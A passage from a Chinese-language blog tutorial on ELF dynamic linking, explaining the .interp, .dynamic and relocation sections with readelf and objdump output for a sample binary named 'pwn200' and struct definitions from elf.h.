<h3 id="2-1、“-interp”节"><a href="#2-1、“-interp”节" class="headerlink" title="2.1、“.interp”节"></a>2.1、“.interp”节</h3><p>&emsp;&emsp;<code>动态链接器的位置</code>既不是由<code>系统配置</code>指定，也不是由<code>环境参数</code>决定，而是由<code>ELF可执行文件</code>决定。在<code>动态链接</code>的<code>ELF可执行文件</code>中，有一个专门的节叫做<strong><code>“.interp”</code></strong>节（“interp”是<code>“interpreter”(解释器)</code>的缩写）。如果我们使用<code>objdump</code>工具来查看，可以看到<code>“.interp”</code>内容：[<a href="#Ref1">1</a>]<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -s pwn200</span><br><span class="line"></span><br><span class="line">pwn200:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .interp:</span><br><span class="line"> 8048134 2f6c6962 2f6c642d 6c696e75 782e736f  /lib/ld-linux.so</span><br><span class="line"> 8048144 2e3200                               .2.</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;<strong><code>“.interp”</code></strong>的内容很简单，里面保存的就是<code>一个字符串</code>，这个字符串就是<code>可执行文件</code>所需要的<code>动态链接器的路径</code>，在<code>Linux</code>下，可执行文件所需要的动态链接器的路径几乎都是<code>“/lib/ld-linux.so.2”</code>，其他的<code>*nix操作系统</code>可能会有不同的路径。在<code>Linux</code>的系统中，<code>/lib/ld-linux.so.2</code>通常是一个<code>软链接</code>，比如在我的机器上，它指向<code>/lib/ld-2.6.1.so</code>，这个才是真正的<code>动态链接器</code>。在Linux中，操作系统在对<code>可执行文件</code>的进行<code>加载</code>的时候，它会去寻找<code>装载</code>该可执行文件所需要相应的<code>动态链接器</code>，即<code>“.interp”</code>节指定的路径的<code>共享对象</code>。</p>
<p>&emsp;&emsp;<code>动态链接器</code>在Linux下是<code>Glibc的一部分</code>，也就是属于<code>系统库级别</code>的，它的<code>版本号</code>往往跟系统中的<code>Glibc库版本号</code>是一样的，比如我的系统中安装的是<code>Glibc 2.6.1</code>，那么相应的<code>动态链接器</code>也就是<code>/lib/ld-2.6.1.so</code>。当系统中的<code>Glibc库更新</code>或者安装<code>其他版本</code>的时候，<code>/lib/ld-linux.so.2</code>这个<code>软链接</code>就会指向到<code>新的动态链接器</code>，而<code>可执行文件</code>本身不需要修改<code>“.interp”</code>中的<code>动态链接器路径</code>来适应系统的升级。</p>
<p>&emsp;&emsp;我们也可以用这个命令来查看一个<code>可执行文件</code>所需要的<code>动态链接器的路径</code>，在Linux下，往往是如下结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -l a.out | grep interpreter</span><br><span class="line">      [Requesting program interpreter: /lib/ld-linux.so.2]</span><br></pre></td></tr></table></figure></p>
<p>而当我们在<code>FreeBSD 4.6.2</code>下执行这个命令时，结果是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -l a.out | grep interpreter</span><br><span class="line">     [Requesting program interpreter: /usr/libexec/ld-elf.so.1]</span><br></pre></td></tr></table></figure></p>
<p><code>64位的Linux</code>下的可执行文件是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -l a.out | grep interpreter</span><br><span class="line">     [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]</span><br></pre></td></tr></table></figure></p>
<h3 id="2-2、“-dynamic”节"><a href="#2-2、“-dynamic”节" class="headerlink" title="2.2、“.dynamic”节"></a>2.2、“.dynamic”节</h3><p>&emsp;&emsp;类似于<code>“.interp”</code>这样的节，ELF中还有几个节也是<code>专门用于动态链接</code>的，比如<code>“.dynamic”节</code>和<code>“.dynsym”节</code>等。要了解<code>动态链接器</code>如何完成<code>链接过程</code>，跟前面一样，从了解<code>ELF文件</code>中跟<code>动态链接相关的结构</code>入手将会是一个很好的途径。ELF文件中跟动态链接相关的节有好几个，相互之间的关系也比较复杂，我们先从<code>“.dynamic”节</code>入手。</p>
<p>&emsp;&emsp;动态链接ELF中<code>最重要的结构</code>应该是<strong><code>“.dynamic”节</code></strong>，这个节里面保存了<code>动态链接器</code>所需要的<code>基本信息</code>，比如依赖于哪些<code>共享对象</code>、<code>动态链接符号表</code>的位置、<code>动态链接重定位表</code>的位置、<code>共享对象初始化代码</code>的地址等。<code>“.dynamic”节的结构</code>很经典，就是我们已经碰到过的ELF中眼熟的<code>结构数组</code>，结构定义在<code>“elf.h”</code>中：[<a href="#Ref3">3</a>]<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Sxword d_tag;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        Elf64_Xword d_val;  </span><br><span class="line">        Elf64_Addr d_ptr;    </span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;<code>Elf32_Dyn</code>结构由一个<code>类型值</code>加上一个附加的<code>数值</code>或<code>指针</code>，对于<code>不同的类型</code>，后面附加的<code>数值</code>或者<code>指针</code>有着<code>不同的含义</code>。我们这里列举几个比较<code>常见的类型值</code>(这些值都是定义在<code>“elf.h”里面的宏</code>)，如下表所示：[<a href="#Ref3">3</a>]</p>
<table>
<thead>
<tr>
<th style="text-align:left">d_tag类型</th>
<th style="text-align:left">d_un的含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">DT_NEEDED</td>
<td style="text-align:left">ELF所依赖的共享库文件名，d_val表示共享库文件名在“.dynstr”表中的偏移</td>
</tr>
<tr>
<td style="text-align:left">DT_INIT</td>
<td style="text-align:left">d_ptr表示init函数地址</td>
</tr>
<tr>
<td style="text-align:left">DT_INIT_ARRAY</td>
<td style="text-align:left">d_ptr表示有关初始化的函数的地址数组的地址</td>
</tr>
<tr>
<td style="text-align:left">DT_INIT_ARRAYSZ</td>
<td style="text-align:left">d_val表示DT_INIT_ARRAY数组的大小</td>
</tr>
<tr>
<td style="text-align:left">DT_FINI</td>
<td style="text-align:left">d_ptr表示fini函数地址</td>
</tr>
<tr>
<td style="text-align:left">DT_FINI_ARRAY</td>
<td style="text-align:left">d_ptr表示有关结束清理的函数的地址数组的地址</td>
</tr>
<tr>
<td style="text-align:left">DT_FINI_ARRAYSZ</td>
<td style="text-align:left">d_val表示DT_FINI_ARRAY数组的大小</td>
</tr>
<tr>
<td style="text-align:left">DT_HASH</td>
<td style="text-align:left">动态链接符号Hash表地址，d_ptr表示“.hash”的地址</td>
</tr>
<tr>
<td style="text-align:left">DT_GNU_HASH</td>
<td style="text-align:left">动态链接GNU风格的Hash表的地址，d_ptr表示“.gnu.hash”的地址</td>
</tr>
<tr>
<td style="text-align:left">DT_STRTAB</td>
<td style="text-align:left">动态链接字符串表的地址，d_ptr表示“.dynstr”的地址</td>
</tr>
<tr>
<td style="text-align:left">DT_STRSZ</td>
<td style="text-align:left">d_val表示动态链接字符串表“.dynstr”的大小</td>
</tr>
<tr>
<td style="text-align:left">DT_SYMTAB</td>
<td style="text-align:left">动态链接符号表的地址，d_ptr表示“.dynsym”的地址</td>
</tr>
<tr>
<td style="text-align:left">DT_SYMENT</td>
<td style="text-align:left">d_val表示动态链接符号表“.dynsym”中每一项的大小</td>
</tr>
<tr>
<td style="text-align:left">DT_PLTGOT</td>
<td style="text-align:left">d_ptr表示全局偏移表“.got.plt”地址。</td>
</tr>
<tr>
<td style="text-align:left">DT_PLTREL</td>
<td style="text-align:left">d_val表示动态链接重定位表的类型值“d_tag”，也就是DT_REL对应的值</td>
</tr>
<tr>
<td style="text-align:left">DT_PLTRELSZ</td>
<td style="text-align:left">d_val表示动态链接重定位表中函数重定位表“.rel.plt”的大小</td>
</tr>
<tr>
<td style="text-align:left">DT_JMPREL</td>
<td style="text-align:left">d_ptr表示动态链接重定位表中函数重定位表“.rel.plt”的地址</td>
</tr>
<tr>
<td style="text-align:left">DT_REL</td>
<td style="text-align:left">d_ptr表示动态链接重定位表的地址(ELF32)</td>
</tr>
<tr>
<td style="text-align:left">DT_RELSZ</td>
<td style="text-align:left">d_val表示动态链接重定位表中变量重定位表“.rel.dyn”的大小(ELF32)</td>
</tr>
<tr>
<td style="text-align:left">DT_RELENT</td>
<td style="text-align:left">d_val表示动态链接重定位表中每一项的大小(ELF32)</td>
</tr>
<tr>
<td style="text-align:left">DT_RELA</td>
<td style="text-align:left">d_ptr表示动态链接重定位表的地址(ELF64)</td>
</tr>
<tr>
<td style="text-align:left">DT_RELASZ</td>
<td style="text-align:left">d_val表示动态链接重定位表中变量重定位表“.rel.dyn”的大小(ELF64)</td>
</tr>
<tr>
<td style="text-align:left">DT_RELAENT</td>
<td style="text-align:left">d_val表示动态链接重定位表中每一项的大小(ELF64)</td>
</tr>
<tr>
<td style="text-align:left">DT_VERNEED</td>
<td style="text-align:left">d_ptr表示ELF文件所需要的库文件版本表的地址</td>
</tr>
<tr>
<td style="text-align:left">DT_VERNEEDNUM</td>
<td style="text-align:left">d_val表示ELF文件所需要的库文件版本表条目的数量</td>
</tr>
<tr>
<td style="text-align:left">DT_VERSYM</td>
<td style="text-align:left">d_ptr表示动态符号版本表“.gnu.version”的地址</td>
</tr>
<tr>
<td style="text-align:left">DT_SONAME</td>
<td style="text-align:left">d_val表示共享库名称</td>
</tr>
<tr>
<td style="text-align:left">DT_RPATH</td>
<td style="text-align:left">d_val表示库搜索路径（不建议使用）</td>
</tr>
<tr>
<td style="text-align:left">DT_NULL</td>
<td style="text-align:left">标记“.dynamic”节的结束</td>
</tr>
</tbody>
</table>
<p><strong><code>定义代码：</code></strong>[<a href="#Ref3">3</a>]<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Legal values for d_tag (dynamic entry type).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_NULL     0   <span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_NEEDED   1   <span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTRELSZ 2   <span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTGOT   3   <span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_HASH     4   <span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_STRTAB   5   <span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMTAB   6   <span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELA     7   <span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELASZ   8   <span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELAENT  9   <span class="comment">/* Size of one Rela reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_STRSZ    10  <span class="comment">/* Size of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMENT   11  <span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_INIT     12  <span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_FINI     13  <span class="comment">/* Address of termination function */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SONAME   14  <span class="comment">/* Name of shared object */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RPATH    15  <span class="comment">/* Library search path (deprecated) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMBOLIC 16  <span class="comment">/* Start symbol search here */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_REL      17  <span class="comment">/* Address of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELSZ    18  <span class="comment">/* Total size of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELENT   19  <span class="comment">/* Size of one Rel reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTREL   20  <span class="comment">/* Type of reloc in PLT */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_DEBUG    21  <span class="comment">/* For debugging; unspecified */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_TEXTREL  22  <span class="comment">/* Reloc might modify .text */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_JMPREL   23  <span class="comment">/* Address of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_BIND_NOW 24  <span class="comment">/* Process relocations of object */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_INIT_ARRAY 25  <span class="comment">/* Array with addresses of init fct */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_FINI_ARRAY 26  <span class="comment">/* Array with addresses of fini fct */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_INIT_ARRAYSZ 27  <span class="comment">/* Size in bytes of DT_INIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_FINI_ARRAYSZ 28  <span class="comment">/* Size in bytes of DT_FINI_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RUNPATH      29  <span class="comment">/* Library search path */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_FLAGS        30  <span class="comment">/* Flags for the object being loaded */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_ENCODING     31  <span class="comment">/* Start of encoded range */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PREINIT_ARRAY 32  <span class="comment">/* Array with addresses of preinit fct*/</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PREINIT_ARRAYSZ 33  <span class="comment">/* size in bytes of DT_PREINIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMTAB_SHNDX    34  <span class="comment">/* Address of SYMTAB_SHNDX section */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_NUM             35  <span class="comment">/* Number used */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_LOOS    0x6000000d  <span class="comment">/* Start of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_HIOS    0x6ffff000  <span class="comment">/* End of OS-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_LOPROC  0x70000000  <span class="comment">/* Start of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_HIPROC  0x7fffffff  <span class="comment">/* End of processor-specific */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PROCNUM DT_MIPS_NUM  <span class="comment">/* Most used by any processor */</span></span></span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;上表中只列出了<code>一部分定义</code>，还有一些不太常用的定义我们就暂且忽略，具体可以参考<code>LSB手册</code>和<code>elf.h的定义</code>。从上面给出的这些定义来看，<code>“.dynamic”</code>节里面保存的信息有点像<code>ELF文件头</code>，只是我们前面看到的<code>ELF文件头</code>中保存的是<code>静态链接</code>时相关的内容，比如<code>静态链接</code>时用到的<code>符号表</code>、<code>重定位表</code>等，这里换成了<code>动态链接</code>下所使用的相应信息了。所以，<code>“.dynamic”</code>节可以看成是<code>动态链接</code>下<code>ELF文件的“文件头”</code>。使用<code>readelf</code>工具可以查看<code>“.dynamic”节</code>的内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d pwn200</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x750 contains 25 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x8048328</span><br><span class="line"> 0x0000000d (FINI)                       0x8048650</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x8049744</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x8049748</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x00000004 (HASH)                       0x804818c</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x80481c0</span><br><span class="line"> 0x00000005 (STRTAB)                     0x8048260</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x80481e0</span><br><span class="line"> 0x0000000a (STRSZ)                      95 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x8049844</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   48 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x80482f8</span><br><span class="line"> 0x00000011 (REL)                        0x80482f0</span><br><span class="line"> 0x00000012 (RELSZ)                      8 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x80482d0</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x80482c0</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure></p>
<h3 id="2-3、“-rel-dyn”节和“-rel-plt”节"><a href="#2-3、“-rel-dyn”节和“-rel-plt”节" class="headerlink" title="2.3、“.rel.dyn”节和“.rel.plt”节"></a>2.3、“.rel.dyn”节和“.rel.plt”节</h3><p>&emsp;&emsp;我们可以使用<code>readelf</code>查看重定位表节：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r pwn200</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">'.rel.dyn'</span> at offset 0x2f0 contains 1 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049840  00000206 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">'.rel.plt'</span> at offset 0x2f8 contains 6 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049850  00000107 R_386_JUMP_SLOT   00000000   <span class="built_in">read</span>@GLIBC_2.0</span><br><span class="line">08049854  00000207 R_386_JUMP_SLOT   00000000   __gmon_start__</span><br><span class="line">08049858  00000307 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0</span><br><span class="line">0804985c  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">08049860  00000507 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br><span class="line">08049864  00000607 R_386_JUMP_SLOT   00000000   strncmp@GLIBC_2.0</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;<strong><code>“.rel.dyn”</code></strong>实际上是对<code>数据引用</code>的修正，它所修正的位置位于<code>“.got”</code>以及<code>数据节</code>；而<strong><code>“.rel.plt”</code></strong>是对<code>函数引用</code>的修正，它所修正的位置位于<code>“.got.plt”</code>。<br>&emsp;&emsp;<code>32位</code>和<code>64位</code>ELF使用的<code>重定位表</code>有一点区别，但都是<code>结构体数组</code>。一般<code>32位</code>使用<strong><code>Elf32_Rel</code></strong>,<code>64位</code>使用<strong><code>Elf32_Rela</code></strong>。结构体定义如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset; <span class="comment">/* 表示重定位所作用的虚拟地址或相对基地址的偏移 */</span></span><br><span class="line">    Elf32_Word r_info;   <span class="comment">/* 重定位类型和符号表下标 */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Addr r_offset; <span class="comment">/* 表示重定位所作用的虚拟地址或相对基地址的偏移 */</span></span><br><span class="line">    Elf64_Xword r_info;  <span class="comment">/* 重定位类型和符号表下标 */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Relocation table entry with addend (in section of type SHT_RELA).  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;  <span class="comment">/* 表示重定位所作用的虚拟地址或相对基地址的偏移 */</span></span><br><span class="line">    Elf32_Word r_info;    <span class="comment">/* 重定位类型和符号表下标 */</span></span><br><span class="line">    Elf32_Sword r_addend; <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf32_Rela;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Addr r_offset;  <span class="comment">/* 表示重定位所作用的虚拟地址或相对基地址的偏移 */</span></span><br><span class="line">    Elf64_Xword r_info;   <span class="comment">/* 重定位类型和符号表下标 */</span></span><br><span class="line">    Elf64_Sxword r_addend; <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"><span class="comment">//获得高24位，表示在符号表中的下标</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(val)  ((val) &gt;&gt; 8) </span></span><br><span class="line"><span class="comment">//获得低8位，表示重定位类型</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(val)  ((val) &amp; 0xff) </span></span><br><span class="line"><span class="comment">//通过R_SYM和R_Type重组r_info</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_INFO(sym, type)  (((sym) &lt;&lt; 8) + ((type) &amp; 0xff)) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获得高32位，表示在符号表中的下标</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_SYM(i)  ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="comment">//获得低32位，表示重定位类型</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_TYPE(i)  ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="comment">//通过R_SYM和R_Type重组r_info</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_INFO(sym,type)  ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;<strong><code>32位ELF</code></strong>一般使用的<code>重定位表项</code>的结构体是<strong><code>Elf32_Rel</code></strong>，其中包含<code>r_offset</code>和<code>r_info</code>两个成员，都是<code>4byte</code>类型的变量。<strong><code>r_offset：</code></strong>表示重定位所<code>作用的位置</code>。对于<code>重定位文件(.o)</code>来说，此值是<code>受重定位作用</code>的<code>存储单元</code>在<code>其所在节</code>中的<code>字节偏移量</code>；对于<code>可执行文件</code>或<code>共享目标文件(.so)</code>来说，此值是<code>受重定位作用</code>的<code>存储单元</code>的<code>虚拟地址</code>。<strong><code>r_info：</code></strong>其<code>高24位</code>表示该重定位项在<code>动态链接符号表.dynsym</code>中对应项的<code>下标</code>，<code>低8位</code>表示该重定位项的<code>重定向类型</code>。<br>&emsp;&emsp;<strong><code>64位ELF</code></strong>一般使用的<code>重定位表项</code>的结构体是<strong><code>Elf64_Rela</code></strong>，其中包含<code>r_offset</code>、<code>r_info</code>和<code>r_addend</code>三个成员，都是<code>8byte</code>类型的变量。<strong><code>r_offset：</code></strong>表示重定位所<code>作用的位置</code>。对于<code>重定位文件(.o)</code>来说，此值是<code>受重定位作用</code>的<code>存储单元</code>在<code>其所在节</code>中的<code>字节偏移量</code>；对于<code>可执行文件</code>或<code>共享目标文件(.so)</code>来说，此值是<code>受重定位作用</code>的<code>存储单元</code>的<code>虚拟地址</code>。<strong><code>r_info：</code></strong>其<code>高32位</code>表示该重定位项在<code>动态链接符号表.dynsym</code>中对应项的<code>下标</code>，<code>低32位</code>表示该重定位项的<code>重定向类型</code>。<strong><code>r_addend：</code></strong>此成员指定<code>常量加数</code>，用于计算将存储在<code>可重定位字段中的值</code>。<code>Elf32_Rela</code>中是用r_addend<code>显式</code>地指出加数;而对 <code>Elf32_Rel</code>来说,加数是<code>隐含</code>在被修改的位置里的。在<code>所有情况</code>下，<code>加数</code>和<code>计算所得的结果</code>使用相同的<code>字节顺序</code>。<code>加数值</code>的<code>重定位项类型</code>和<code>解释</code>由特定于平台的 ABI 定义。<br>&emsp;&emsp;<code>重定位节</code>可以引用其他两个节：<code>符号表</code>（由 <code>sh_link</code> 节头项标识）和<code>要修改的节</code>（由 <code>sh_info</code> 